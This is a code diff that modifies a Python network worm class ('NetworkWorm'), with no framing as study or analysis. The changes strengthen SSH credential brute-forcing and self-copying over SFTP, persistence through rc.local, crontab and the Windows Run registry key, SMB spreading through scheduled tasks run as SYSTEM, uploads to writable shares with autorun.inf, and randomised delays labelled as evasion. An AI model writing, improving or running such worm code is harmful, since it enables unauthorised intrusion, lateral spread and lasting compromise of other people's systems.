@@ -3,6 +3,8 @@ import os
 import sys
 import socket
 import threading
+from io import StringIO
+
 import paramiko
 import subprocess
 import logging
@@ -218,34 +220,52 @@ class NetworkWorm:
             return None
 
     def _ssh_infection(self, ip):
-        for user, passwd in CREDS:
+        # Use persistent path
+        dest_path = f"/usr/local/bin/.{self.fingerprint}.py"
+
+        for user, passwd in random.sample(CREDS, len(CREDS)):  # Random order
             try:
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(ip, username=user, password=passwd, timeout=10)
+                client.connect(ip, username=user, password=passwd, timeout=10, banner_timeout=15)
 
                 with client.open_sftp() as sftp:
-                    sftp.put(__file__, f"/tmp/.{self.fingerprint}")
-                    sftp.chmod(f"/tmp/.{self.fingerprint}", 0o755)
+                    sftp.put(__file__, dest_path)
+                    sftp.chmod(dest_path, 0o755)
 
-                client.exec_command(f"echo '@reboot /tmp/.{self.fingerprint}' | crontab -")
-                client.exec_command(f"nohup /tmp/.{self.fingerprint} &>/dev/null &")
+                # Add to rc.local for persistence
+                client.exec_command(
+                    f"echo 'python {dest_path}' | sudo tee -a /etc/rc.local"
+                )
                 self._mark_infection(ip)
                 return ip
-            except:
+            except paramiko.ssh_exception.SSHException as e:
+                logging.debug(f"SSH failed with {user}: {str(e)}")
                 continue
         return None
 
     def _smb_infection(self, ip):
         try:
-            dest = fr"\\{ip}\C$\Windows\Temp\{self.fingerprint}.exe"
-            shutil.copyfile(self.worm_path, dest)
+            # Copy as Python file instead of .exe
+            dest_file = f"{self.fingerprint}.py"
+            dest_path = fr"\\{ip}\C$\Windows\Temp\{dest_file}"
+
+            # Copy worm script
+            shutil.copyfile(self.worm_path, dest_path)
+
+            # Create scheduled task to run with Python
             subprocess.run([
-                'schtasks', '/create', '/s', ip, '/tn', f'WindowsUpdate_{self.fingerprint}',
-                '/tr', dest, '/sc', 'ONSTART', '/ru', 'SYSTEM', '/f'
-            ], check=True)
+                'schtasks', '/create', '/s', ip, '/tn',
+                f'WindowsUpdate_{self.fingerprint}', '/tr',
+                f'python "{dest_path}"', '/sc', 'ONSTART',
+                '/ru', 'SYSTEM', '/f'
+            ], check=True, timeout=30)
+
             self._mark_infection(ip)
             return ip
+        except subprocess.TimeoutExpired:
+            logging.error("SMB task creation timed out")
+            return None
         except Exception as e:
             logging.error(f"SMB infection failed: {str(e)}")
             return None
@@ -253,17 +273,25 @@ class NetworkWorm:
     def self_replicate(self):
         try:
             if os.name == 'posix':
-                dest = f"/usr/lib/.{self.fingerprint}"
+                # Use persistent directory
+                dest = f"/usr/lib/.{self.fingerprint}.py"
                 shutil.copy(__file__, dest)
                 os.chmod(dest, 0o755)
-                subprocess.run(f"(crontab -l ; echo '@reboot {dest}') | crontab -", shell=True)
+                subprocess.run(
+                    f"(crontab -l ; echo '@reboot python {dest}') | crontab -",
+                    shell=True
+                )
             else:
-                dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
+                # Copy as Python file
+                dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.py"
                 shutil.copy(__file__, dest)
+
+                # Registry command with Python
                 subprocess.run(
                     f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
-                    f'/v "{self.fingerprint}" /t REG_SZ /d "{dest}" /f',
-                    shell=True
+                    f'/v "{self.fingerprint}" /t REG_SZ /d "python \\"{dest}\\"" /f',
+                    shell=True,
+                    check=True
                 )
         except Exception as e:
             logging.error(f"Replication failed: {str(e)}")
@@ -366,44 +394,69 @@ class NetworkWorm:
         ], check=True)
 
     def _exploit_network_shares(self):
-
+        # Validate IP ranges before scanning
+        valid_ips = []
         for subnet in SCAN_SUBNETS:
             network = ipaddress.ip_network(subnet, strict=False)
             for host in network.hosts():
-                ip = str(host)
+                if str(host) not in ['192.168.100.255', '10.0.255.255']:  # Skip broadcast
+                    valid_ips.append(str(host))
+
+        for ip in valid_ips:
+            try:
+                # Randomize credential attempts
+                random.shuffle(self.CREDS)
+                conn = None
+
+                # First try guest account
                 try:
-                    # Try guest/anonymous login first
                     conn = SMBConnection('', '', 'worm', ip, use_ntlm_v2=True)
-                    connected = conn.connect(ip, 445, timeout=5)
-
-                    if not connected:
-                        # Try with credentials if guest access fails
-                        for user, passwd in self.CREDS:
+                    if not conn.connect(ip, 445, timeout=3):
+                        raise OperationFailure
+                except:
+                    # Try credentials with randomized delay
+                    for user, passwd in self.CREDS:
+                        try:
+                            sleep(random.uniform(0.1, 1.5))  # Evasion
                             conn = SMBConnection(user, passwd, 'worm', ip, use_ntlm_v2=True)
-                            if conn.connect(ip, 445, timeout=5):
+                            if conn.connect(ip, 445, timeout=3):
                                 break
-                        else:
-                            continue  # No valid credentials found
+                        except:
+                            continue
+                    else:
+                        continue
 
-                    shares = conn.listShares()
-                    for share in shares:
-                        if not share.isSpecial and share.name not in ['IPC$', 'print$']:
-                            try:
-                                dest_path = f"/Windows/Temp/{self.fingerprint}.exe"
-                                with open(self.worm_path, 'rb') as file_obj:
-                                    conn.storeFile(share.name, dest_path, file_obj)
-                                logging.info(f"Copied to {ip}/{share.name}")
-                            except OperationFailure:
-                                try:  # Try creating directory structure
-                                    conn.createDirectory(share.name, '/Windows/Temp')
-                                    with open(self.worm_path, 'rb') as file_obj:
-                                        conn.storeFile(share.name, dest_path, file_obj)
-                                except Exception as e:
-                                    logging.error(f"Share error {ip}/{share.name}: {str(e)}")
+                # Target writeable shares
+                shares = [s for s in conn.listShares()
+                          if not s.isSpecial
+                          and s.name not in ['IPC$', 'print$']
+                          and 'WRITE' in s.access]
 
-                    conn.close()
-                except Exception as e:
-                    continue
+                for share in shares:
+                    try:
+                        dest_dir = "/Windows/Temp"
+                        dest_file = f"{self.fingerprint}.py"
+
+                        # Verify directory exists
+                        if not conn.listPath(share.name, dest_dir):
+                            conn.createDirectory(share.name, dest_dir)
+
+                        # Upload worm
+                        with open(self.worm_path, 'rb') as file_obj:
+                            conn.storeFile(share.name, f"{dest_dir}/{dest_file}", file_obj)
+
+                        # Create autorun.inf
+                        conn.storeFile(share.name, f"{dest_dir}/autorun.inf",
+                                       StringIO(f"[autorun]\nopen=python {dest_file}"))
+
+                    except OperationFailure as e:
+                        logging.error(f"Share access denied: {ip}/{share.name}")
+                    except Exception as e:
+                        logging.error(f"Share error {ip}/{share.name}: {str(e)}")
+
+                conn.close()
+            except Exception as e:
+                continue
 
     def _infect_removable_drives(self):
         drives = []
